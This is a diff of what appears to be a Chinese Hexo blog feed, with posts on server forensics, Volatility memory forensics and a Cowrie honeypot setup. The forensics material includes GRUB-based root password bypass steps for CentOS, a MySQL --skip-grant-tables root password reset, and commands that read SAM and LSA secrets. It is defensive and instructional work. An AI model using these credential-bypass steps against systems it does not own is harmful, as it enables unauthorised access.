+<h6 id="Centos7密码绕过"><a href="#Centos7密码绕过" class="headerlink" title="Centos7密码绕过"></a>Centos7密码绕过</h6><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line"></span><br><span class="line">启动时任意键暂停启动        </span><br><span class="line">按e键进入编辑模式        </span><br><span class="line">将光标移动到linux16开始的行，将ro改为rw init=<span class="regexp">/sysroot/</span>bin/sh       </span><br><span class="line">按Ctrl-x启动        </span><br><span class="line">chroot /sysroot </span><br><span class="line">LANG=en（如果出现乱码）</span><br><span class="line">passwd root        </span><br><span class="line">touch /.autorelabel         <span class="comment"># (如果你系统没有开启selinux，那么可以不做这一步)        </span></span><br><span class="line"><span class="keyword">exit</span>         </span><br><span class="line">reboot         </span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line"></span><br><span class="line">启动时任意键暂停启动</span><br><span class="line">按e键进入编辑模式</span><br><span class="line">将光标移动到linux16开始的行，添加内核参数rd.<span class="keyword">break</span></span><br><span class="line">按Ctrl-x启动</span><br><span class="line">mount -o remount,rw /sysroot</span><br><span class="line">chroot /sysroot</span><br><span class="line">LANG=en（如果出现乱码）</span><br><span class="line">passwd root</span><br><span class="line">touch /.autorelabel</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line">reboot </span><br></pre></td></tr></table></figure>
 
 <p>说实话，我没有绕，直接尝试<code>root:12456</code>组合就成功进去了。。。</p>
 <p>查看Linux系统类型、详细版本号：</p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>version</span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/etc/</span>redhat-release</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">uname -r</span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/ertc/i</span>ssue</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cat <span class="regexp">/proc/</span>version</span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/etc/</span>redhat-release</span><br><span class="line"></span><br><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">uname -r</span><br><span class="line"></span><br><span class="line">cat <span class="regexp">/ertc/i</span>ssue</span><br></pre></td></tr></table></figure>
 
 <p>linux版本号相关知识：</p>
 <p>3.10.0-693.el7.x86_64<br>3：目前发布的主版本号<br>10：次版本号，偶数表示稳定版本；奇数表示开发中版本。<br>0：错误修补的次数<br>693：表示当前版本的第五次微调patch<br>el：表示多处理器</p>
@@ -231,16 +283,16 @@
 <p><img src="/images/pasted-11.png" alt="upload successful"></p>
 <p><code>my.cnf</code>是mysql启动时加载的配置文件，一般会放在mysql的安装目录中，用户也可以放在其他目录加载。<br>运用 <code>find / -name my.cnf</code>可以列出所有的数据库配置文件。</p>
 <p>查看当前运行的mysql进程是否使用指定配置文件：<code>ps -aux | grep mysql</code>或者是<code>ps -ef | grep mysql 查看进程使用的文件</code></p>
-<p>如果没有设置使用指定目录的my.cnf，mysql启动时会读取安装目录根目录及默认目录下的my.cnf文件。<br>查看mysql默认读取my.cnf的目录：<code>mysql --help | grep 'my.cnf</code></p>
+<p>如果没有设置使用指定目录的my.cnf，mysql启动时会读取安装目录根目录及默认目录下的my.cnf文件。<br>查看mysql默认读取my.cnf的目录：<code>mysql --help | grep &#39;my.cnf</code></p>
 <p>如果指定目录下都没有配置文件，那就是加载mysql的时候没有使用配置文件。</p>
 <p>因为不知道本地数据库的密码，所以我们更换登录配置文件，使我们能够以无密码登录的状态登录进去。</p>
-<figure class="highlight pgsql"><table><tbody><tr><td class="code"><pre><span class="line">systemctl stop mysqld</span><br><span class="line"></span><br><span class="line">mysqld <span class="comment">--user=root --skip-grant-tables &amp;</span></span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line"><span class="meta">#mysql5.7以下版本</span></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.<span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">Password</span>=<span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>) <span class="keyword">where</span> <span class="keyword">USER</span>=<span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#mysql5.7</span></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.<span class="keyword">user</span> <span class="keyword">SET</span> authentication_string=<span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>) <span class="keyword">where</span> <span class="keyword">USER</span>=<span class="string">'root'</span>;</span><br><span class="line">#建议<span class="keyword">desc</span> <span class="keyword">user</span>；查看是<span class="keyword">password</span>还是authenticatoni_string</span><br><span class="line"></span><br><span class="line">flush <span class="keyword">privileges</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="keyword">restart</span> mysqld</span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">systemctl stop mysqld</span><br><span class="line"></span><br><span class="line">mysqld <span class="comment">--user=root --skip-grant-tables &amp;</span></span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br><span class="line"></span><br><span class="line"><span class="meta">#mysql5.7以下版本</span></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.<span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">Password</span>=<span class="keyword">PASSWORD</span>(<span class="string">&#x27;123456&#x27;</span>) <span class="keyword">where</span> <span class="keyword">USER</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#mysql5.7</span></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.<span class="keyword">user</span> <span class="keyword">SET</span> authentication_string=<span class="keyword">PASSWORD</span>(<span class="string">&#x27;123456&#x27;</span>) <span class="keyword">where</span> <span class="keyword">USER</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">#建议<span class="keyword">desc</span> <span class="keyword">user</span>；查看是<span class="keyword">password</span>还是authenticatoni_string</span><br><span class="line"></span><br><span class="line">flush <span class="keyword">privileges</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="keyword">restart</span> mysqld</span><br><span class="line"></span><br><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
 
 <h6 id="查看mysql版本号："><a href="#查看mysql版本号：" class="headerlink" title="查看mysql版本号："></a>查看mysql版本号：</h6><p>在终端下：mysql -V<br>在终端下：mysql –help | grep Distrib<br>在mysql中：mysql&gt; status;<br>在mysql中：select version();</p>
 <h6 id="三种重启命令："><a href="#三种重启命令：" class="headerlink" title="三种重启命令："></a>三种重启命令：</h6><p>/etc/init.d/mysqld restart<br>systemctl restart mysql<br>service mysqld restart</p>
-<h6 id="etc-shadow文件"><a href="#etc-shadow文件" class="headerlink" title="/etc/shadow文件"></a>/etc/shadow文件</h6><p>口令：<br>如果为空，则对应用户没有口令，登录时不需要口令；<br>星号代表帐号被锁定；<br>双叹号表示这个密码已经过期了；<br>$6$开头的，表明是用SHA-512加密；<br>$1$表明是用MD5加密；<br>$2$&nbsp;是用Blowfish加密；<br>$5$&nbsp;是用 SHA-256加密；</p>
+<h6 id="etc-shadow文件"><a href="#etc-shadow文件" class="headerlink" title="/etc/shadow文件"></a>/etc/shadow文件</h6><p>口令：<br>如果为空，则对应用户没有口令，登录时不需要口令；<br>星号代表帐号被锁定；<br>双叹号表示这个密码已经过期了；<br>$6$开头的，表明是用SHA-512加密；<br>$1$表明是用MD5加密；<br>$2$ 是用Blowfish加密；<br>$5$ 是用 SHA-256加密；</p>
 <p>成功进入数据库后，直接输入</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> mysql;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> mysql;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>,host,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/pasted-16.png" alt="upload successful"></p>
 <p>C6B2B8EC628390A22B99AB0609E5E70A0F962E9F</p>
@@ -350,25 +402,7 @@
 <h5 id="2018年6月24日15-52分左右"><a href="#2018年6月24日15-52分左右" class="headerlink" title="2018年6月24日15:52分左右"></a>2018年6月24日15:52分左右</h5><p>嫌疑人使用webshell footer.php生成木马文件hlj.php</p>
 <h5 id="2018年6月24日15-50-17-45"><a href="#2018年6月24日15-50-17-45" class="headerlink" title="2018年6月24日15:50-17:45"></a>2018年6月24日15:50-17:45</h5><p>嫌疑人使用xise菜刀连接webshell,下载数据库数据文件mysite.sql,上传数据库管理脚本heb.php，mysite.sql存储于嫌疑人笔记本电脑加密盘E盘中</p>
 <h5 id="2018年6月24日17-45-17-50"><a href="#2018年6月24日17-45-17-50" class="headerlink" title="2018年6月24日17:45-17:50"></a>2018年6月24日17:45-17:50</h5><p>嫌疑人使用heb.php脚本删除mysite数据库中contract表数据49条</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
   </entry>
   <entry>
     <title>内存取证入门</title>
@@ -393,9 +427,9 @@
     -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; psxview</code></pre>
 <h5 id="pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。"><a href="#pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。" class="headerlink" title="pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。"></a>pslist可以枚举系统中的进程，这条命令通过遍历PsActiveProcessHead指针指向的双向链表枚举当前内存中活跃的所有进程信息，主要包括偏移地址、进程ID号、父进程ID号、线程数量、句柄数量、进程会话ID号以及进程开始和退出的时间。</h5><h5 id="psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。"><a href="#psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。" class="headerlink" title="psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。"></a>psscan命令能够通过内存池标签查找的方式枚举系统中的所有进程，这条命令不仅能够显示当前内存中活跃的进程信息，还能够枚举以前终止的进程和被隐藏以及被rootkit破坏的未在活跃进程链表中出现的进程。</h5><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; psscan</code></pre>
 <h5 id="显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。"><a href="#显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。" class="headerlink" title="显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。"></a>显示的时间都是世界统一时间UTC，而中国在东八区，需要转换。</h5><h4 id="查看用户SID："><a href="#查看用户SID：" class="headerlink" title="查看用户SID："></a>查看用户SID：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; getsids</code></pre>
-<h4 id="查看系统中的用户："><a href="#查看系统中的用户：" class="headerlink" title="查看系统中的用户："></a>查看系统中的用户：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K "SAM\Domains\Account\Users\Names"</code></pre>
-<h4 id="获取系统中最后登录用户"><a href="#获取系统中最后登录用户" class="headerlink" title="获取系统中最后登录用户"></a>获取系统中最后登录用户</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></pre>
-<h4 id="查看启动项："><a href="#查看启动项：" class="headerlink" title="查看启动项："></a>查看启动项：</h4><pre><code>     -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K "Microsoft\Windows\CurrentVersion\Run"</code></pre>
+<h4 id="查看系统中的用户："><a href="#查看系统中的用户：" class="headerlink" title="查看系统中的用户："></a>查看系统中的用户：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></pre>
+<h4 id="获取系统中最后登录用户"><a href="#获取系统中最后登录用户" class="headerlink" title="获取系统中最后登录用户"></a>获取系统中最后登录用户</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></pre>
+<h4 id="查看启动项："><a href="#查看启动项：" class="headerlink" title="查看启动项："></a>查看启动项：</h4><pre><code>     -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; printkey -K &quot;Microsoft\Windows\CurrentVersion\Run&quot;</code></pre>
 <h4 id="查看动态链接库的信息："><a href="#查看动态链接库的信息：" class="headerlink" title="查看动态链接库的信息："></a>查看动态链接库的信息：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; dlllist [-p pid]</code></pre>
 <h5 id="显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。"><a href="#显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。" class="headerlink" title="显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。"></a>显示列表包括：动态链接库文件的基地址、文件大小以及文件所在路径。</h5><h4 id="查看临时内存注册表信息："><a href="#查看临时内存注册表信息：" class="headerlink" title="查看临时内存注册表信息："></a>查看临时内存注册表信息：</h4><pre><code>    -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; hivelist
     -f &lt;memdump.img&gt;  --profile=&lt;prifile&gt; lsadump -y SYSTEM的virtualaddr -s SECURITY的virtualaddr
@@ -440,25 +474,7 @@
 <p><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">命令行指南</a></p>
 <p>附上一篇好文章，其中有一些典型的题目可以参考，日后感兴趣的可以做做。<br><a href="http://shaobaobaoer.cn/archives/693/memory-forensics-tool-volatility-usage-and-practice">传送门</a></p>
 <p>另外加上一篇<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html">USB流量分析文章</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <tags>
         <tag>取证</tag>
         <tag>内存</tag>
@@ -493,25 +509,7 @@
 <p>你藏起那么多别人无法知晓的悲哀忧愁，也藏起了一个真实的自我，最后只是在与真正的自己背道而驰，埋葬了青春，辜负了人生。</p>
 <p>及时清理，给抽屉该有的空间，去收纳未来。</p>
 <p>没有什么要藏一辈子，也没有什么可以藏一辈子。那么辛苦，不值得。</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
+]]></content>
       <categories>
         <category>美文</category>
       </categories>
@@ -530,54 +528,36 @@
 <p>ip：80.240.20.182</p>
 <p>address：France</p>
 <h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="抬高默认SSH端口"><a href="#抬高默认SSH端口" class="headerlink" title="抬高默认SSH端口"></a>抬高默认SSH端口</h3><p>在安装Cowrie之前首先将修改默认的ssh端口<code>22</code>让出来，编辑 <code>#Port 22</code> 修改为 <code>Port 22222</code></p>
-<figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh/sshd_config</span><br><span class="line"></span><br><span class="line">修改为 <span class="number">22222</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重新启动ssh服务</span></span><br><span class="line"><span class="regexp">/etc/i</span>nit.d/ssh restart</span><br><span class="line"></span><br><span class="line">断开连接，重新连接ssh，注意，端口已经改为<span class="number">22222</span>。</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vim <span class="regexp">/etc/</span>ssh/sshd_config</span><br><span class="line"></span><br><span class="line">修改为 <span class="number">22222</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重新启动ssh服务</span></span><br><span class="line"><span class="regexp">/etc/i</span>nit.d/ssh restart</span><br><span class="line"></span><br><span class="line">断开连接，重新连接ssh，注意，端口已经改为<span class="number">22222</span>。</span><br></pre></td></tr></table></figure>
 
 <h3 id="安装依赖项"><a href="#安装依赖项" class="headerlink" title="安装依赖项"></a>安装依赖项</h3><p>安装Python3的依赖项</p>
-<figure class="highlight q"><table><tbody><tr><td class="code"><pre><span class="line">apt install git python-virtualenv libssl-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> build-essential libpython3-<span class="built_in">dev</span> python3-minimal authbind virtualenv</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">apt install git python-virtualenv libssl-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> build-essential libpython3-<span class="built_in">dev</span> python3-minimal authbind virtualenv</span><br></pre></td></tr></table></figure>
 
 <p>安装Python2的依赖项</p>
-<figure class="highlight q"><table><tbody><tr><td class="code"><pre><span class="line">apt install git python-virtualenv libssl-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> build-essential libpython-<span class="built_in">dev</span> python2<span class="number">.7</span>-minimal authbind</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight q"><table><tr><td class="code"><pre><span class="line">apt install git python-virtualenv libssl-<span class="built_in">dev</span> libffi-<span class="built_in">dev</span> build-essential libpython-<span class="built_in">dev</span> python2<span class="number">.7</span>-minimal authbind</span><br></pre></td></tr></table></figure>
 
-<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight mipsasm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">adduser </span>--<span class="keyword">disabled-password </span>cowrie</span><br><span class="line">su - cowrie</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">adduser </span>--<span class="keyword">disabled-password </span>cowrie</span><br><span class="line">su - cowrie</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="git代码"><a href="#git代码" class="headerlink" title="git代码"></a>git代码</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">git clone http:<span class="regexp">//gi</span>thub.com<span class="regexp">/cowrie/</span>cowrie</span><br><span class="line">cd cowrie</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="git代码"><a href="#git代码" class="headerlink" title="git代码"></a>git代码</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone http:<span class="regexp">//gi</span>thub.com<span class="regexp">/cowrie/</span>cowrie</span><br><span class="line">cd cowrie</span><br></pre></td></tr></table></figure>
 
-<h3 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h3><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">pwwd</span><br><span class="line">virtualenv <span class="attribute">--python</span>=python3 cowrie-env</span><br><span class="line"><span class="comment">#或者创建Python2的虚拟环境</span></span><br><span class="line">virtualenv <span class="attribute">--python</span>=python2 cowrie-env</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="激活虚拟环境"><a href="#激活虚拟环境" class="headerlink" title="激活虚拟环境"></a>激活虚拟环境</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">pwwd</span><br><span class="line">virtualenv <span class="attribute">--python</span>=python3 cowrie-env</span><br><span class="line"><span class="comment">#或者创建Python2的虚拟环境</span></span><br><span class="line">virtualenv <span class="attribute">--python</span>=python2 cowrie-env</span><br></pre></td></tr></table></figure>
 
 <p>激活环境并安装包：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">source cowrie-env/bin/activate</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade -r requirements.txt</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">source cowrie-env/bin/activate</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade -r requirements.txt</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="创建并修改配置文件"><a href="#创建并修改配置文件" class="headerlink" title="创建并修改配置文件"></a>创建并修改配置文件</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>etc/</span><br><span class="line">cp cowrie.cfg.dist cowrie.cfg</span><br><span class="line">vim cowrie.cfg</span><br><span class="line"><span class="comment">#修改default name 为 Django</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="创建并修改配置文件"><a href="#创建并修改配置文件" class="headerlink" title="创建并修改配置文件"></a>创建并修改配置文件</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>etc/</span><br><span class="line">cp cowrie.cfg.dist cowrie.cfg</span><br><span class="line">vim cowrie.cfg</span><br><span class="line"><span class="comment">#修改default name 为 Django</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>注意，cowrie的ssh默认端口是2222。</p>
-<h3 id="启动Cowrie"><a href="#启动Cowrie" class="headerlink" title="启动Cowrie"></a>启动Cowrie</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span></span><br><span class="line">.<span class="regexp">/bin/</span>cowrie start</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="启动Cowrie"><a href="#启动Cowrie" class="headerlink" title="启动Cowrie"></a>启动Cowrie</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span></span><br><span class="line">.<span class="regexp">/bin/</span>cowrie start</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">iptables -t<span class="built_in"> nat </span>-A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222</span><br></pre></td></tr></table></figure>
 
 <p>为什么选择cowrie的默认SSH端口2222，然后端口转发到22，而不是直接修改cowrie的ssh监听22端口为22。<br>因为，在启动cowrie的时候是以cowrie的普通用户权限执行的，而普通用户不能直接开放1024以内的端口。但是我们又不能用root权限启动cowrie，两者自相矛盾。</p>
-<h3 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h3><figure class="highlight awk"><table><tbody><tr><td class="code"><pre><span class="line">tail -f <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>var<span class="regexp">/log/</span>cowrie/cowrie.json</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h3><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">tail -f <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>var<span class="regexp">/log/</span>cowrie/cowrie.json</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>查看登录成功的记录：</p>
-<figure class="highlight gradle"><table><tbody><tr><td class="code"><pre><span class="line">cat <span class="regexp">/home/</span>cowrie<span class="regexp">/cowrie/</span>var<span class="regexp">/log/</span>cowrie/cowrie.json | <span class="keyword">grep</span> success</span><br><span class="line"></span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.164"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:03.511816Z"</span>,<span class="string">"session"</span>:<span class="string">"86db2c24adca"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.210"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:05.757924Z"</span>,<span class="string">"session"</span>:<span class="string">"ccf709714130"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.169"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:10.460597Z"</span>,<span class="string">"session"</span>:<span class="string">"83c13f52700e"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.169"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:34.359839Z"</span>,<span class="string">"session"</span>:<span class="string">"7758eebae3a3"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"193.32.161.176"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:05:35.328376Z"</span>,<span class="string">"session"</span>:<span class="string">"6dd4c70d1f51"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.220"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span class="string">"eventid"</span>:<span class="string">"cowrie.login.success"</span>,<span class="string">"timestamp"</span>:<span class="string">"2019-09-03T12:06:33.090110Z"</span>,<span class="string">"session"</span>:<span class="string">"df7da3aa3ca1"</span>}</span><br><span class="line">{<span class="string">"password"</span>:<span class="string">"root"</span>,<span class="string">"src_ip"</span>:<span class="string">"5.188.86.210"</span>,<span class="string">"username"</span>:<span class="string">"root"</span>,<span class="string">"sensor"</span>:<span class="string">"vultr.guest"</span>,<span class="string">"message"</span>:<span class="string">"login attempt [root/root] succeeded"</span>,<span 